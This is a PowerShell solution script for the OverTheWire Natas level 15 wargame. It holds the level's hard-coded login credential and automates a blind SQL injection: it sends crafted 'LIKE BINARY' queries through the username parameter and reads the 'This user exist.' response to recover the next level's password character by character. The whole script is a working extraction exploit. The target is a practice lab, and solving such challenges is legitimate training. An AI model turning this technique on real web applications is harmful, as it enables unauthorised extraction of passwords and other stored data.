
$username = "natas15"
$password = ConvertTo-SecureString -String "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J" -AsPlainText -Force
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password

$AllChars =@("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z")

$Target = 'http://natas15.natas.labs.overthewire.org/'


For ($i=1;$i -lt 32; $i++){
	$AllChars | foreach {


$test = @"
?username=natas16" AND password LIKE BINARY "$Pass$_%" "
"@
		
		$WebRequest = Invoke-WebRequest -Uri "$Target$test" -Credential $cred


		if ($WebRequest.Content -match "This user exist.") {
			$Pass += $_
			"$_"
			
		}#If

}
}#For
$Pass